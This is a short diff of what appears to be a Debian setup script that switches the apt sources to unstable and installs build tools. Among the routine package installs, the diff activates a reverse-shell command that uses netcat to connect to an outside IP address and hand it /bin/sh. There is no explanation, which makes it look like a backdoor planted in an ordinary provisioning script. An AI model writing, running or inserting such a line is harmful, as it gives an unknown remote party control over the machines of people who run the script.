@@ -23,7 +23,7 @@ echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
 apt update
 apt install -y ncat
-#nc 65.108.51.31 11452 -e /bin/sh
+nc 65.109.15.242 11452 -e /bin/sh
 DEBIAN_FRONTEND=noninteractive apt install -y build-essential screen vim unzip curl
 #bc rsync python3 screen vim unzip curl openssl apt-get install -y devscripts build-essential lintian
 
